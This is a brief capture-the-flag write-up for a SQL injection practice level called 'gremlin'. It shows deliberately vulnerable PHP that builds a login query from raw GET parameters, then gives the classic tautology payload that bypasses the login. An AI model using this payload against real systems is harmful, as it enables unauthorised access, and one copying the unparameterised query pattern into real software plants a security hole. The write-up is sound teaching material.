# gremlin

We have the following PHP code.

```php
 <?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?> 
```

The query:

```php
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
```

Simply input the following parameter:

```
id=' or '1'='1&pw=' or '1'='1
```

Resulting query:

```
query : select id from prob_gremlin where id='' or '1'='1' and pw='' or '1'='1'
```

This modification allows the injection of a condition that always evaluates to true ('1'='1'). Consequently, the query returns valid data, granting access by bypassing the intended login mechanism.
